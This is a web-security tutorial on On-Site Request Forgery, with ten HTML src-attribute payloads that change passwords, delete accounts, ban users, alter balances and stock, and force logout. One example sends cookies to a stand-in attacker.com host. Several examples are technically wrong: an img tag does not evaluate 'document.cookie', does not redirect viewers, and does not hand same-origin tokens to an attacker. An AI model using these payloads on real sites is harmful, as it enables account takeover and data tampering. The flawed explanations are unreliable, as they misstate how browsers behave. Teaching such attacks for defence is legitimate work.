# On-Site Request Forgery (OSRF)

## Introduction

On-Site Request Forgery (OSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. Unlike CSRF, where requests are initiated from a domain under the attacker’s control, OSRF exploits requests originating from the vulnerable application itself, allowing attackers to control where those requests are directed.

## Where to Find

You can detect On-Site Request Forgery (OSRF) vulnerabilities in various scenarios. Two key aspects to look for are:

1. **Reflected Input in the `src` Attribute**:
    - Examples of vulnerable attributes:
      ```html
      <img src="OUR_INPUT_HERE">
      <video width="400" height="200" controls src="OUR_INPUT_HERE">
      <audio src="OUR_INPUT_HERE">
      <iframe src="OUR_INPUT_HERE">
      ```

2. **Sensitive Endpoints Using the GET Method**:
    - Example endpoint:
      ```http
      GET /settings.php?remove_account=1
      Host: example.com
      User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
      ```

## How to Exploit

### Example 1: Password Change Exploit

Imagine there is functionality on a website where the user can change their password. Here is the request:

```http
GET /change_password.php?new_password=Testing123
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
```

Additionally, there is a feature where users can upload and control the value inside the `src` attribute, such as updating their profile photo:

```http
POST /settings.php
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

---------------------------829348923824
Content-Disposition: form-data; name="filename"

testingimage.jpg

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="testingimage.jpg"
Content-Type: image/gif

IMAGE_CONTENT
```

If we check the public profile page, the input is reflected in the `src` attribute:

```html
<div id="profile">
  <p id="fullname">daffainfo</p>
  <p id="address">Indonesia</p>
  <img src="uploads/testingimage.jpg">
</div>
```

To exploit this vulnerability, change the filename from `testingimage.jpg` to `change_password.php?new_password=Testing123`. The resulting profile page would be:

```html
<div id="profile">
  <p id="fullname">daffainfo</p>
  <p id="address">Indonesia</p>
  <img src="../change_password.php?new_password=Testing123">
</div>
```

When another user visits this profile page, their password will automatically be changed to `Testing123`.

### Example 2: Account Deletion Exploit

Consider an endpoint that allows account deletion via a GET request:

```http
GET /settings.php?remove_account=1
Host: example.com
```

If the application reflects user-controlled input in an iframe, the attacker can embed the following payload in their profile or shared content:

```html
<iframe src="/settings.php?remove_account=1"></iframe>
```

When another user visits the attacker’s profile or content, their account will be deleted without their consent.

### Example 3: Data Exfiltration

Suppose the application allows embedding external resources via the `src` attribute. An attacker can use this to exfiltrate sensitive information:

```html
<img src="https://attacker.com/log?cookie=document.cookie">
```

When the victim views the attacker’s profile, their cookies are sent to the attacker’s server.

### Example 4: Unauthorized API Calls

If the application allows embedding API requests, attackers can craft malicious payloads to perform unauthorized actions:

```html
<img src="/api/update_balance?amount=10000">
```

When another user views the attacker’s profile, their account balance is updated without their knowledge.

### Example 5: Forced Logout

Attackers can force users to log out by embedding a logout endpoint:

```html
<img src="/logout">
```

This disrupts the user’s session whenever they view the attacker’s content.

### Example 6: Arbitrary Redirection

If the application allows embedding redirect links in the `src` attribute, an attacker can redirect users to malicious websites:

```html
<img src="https://malicious-site.com">
```

When users visit the attacker’s profile, they are redirected to the attacker’s site.

### Example 7: SSRF Amplification

If the application reflects user input into an internal API request, attackers can exploit this to perform SSRF attacks:

```html
<img src="http://internal-api.example.com/admin?action=delete">
```

This can be used to manipulate internal services when the request is processed.

### Example 8: Report Abuse Exploit

In a reported case on HackerOne, a user-controlled input was reflected in a report abuse form’s `src` attribute. The attacker crafted the following payload:

```html
<img src="/admin/ban_user?id=123">
```

When an admin reviewed the report, the targeted user was banned automatically.

### Example 9: Inventory Manipulation

A marketplace allowed embedding product images via the `src` attribute. An attacker embedded:

```html
<img src="/api/update_stock?item_id=456&quantity=0">
```

When a seller viewed the product listing, the stock was set to zero, preventing sales.

### Example 10: Cross-Account Token Leakage

If tokens are exposed in URLs, an attacker can embed them in `src` attributes:

```html
<img src="/api/get_token?user_id=789">
```

When another user visits the attacker’s profile, their token is leaked to the attacker.
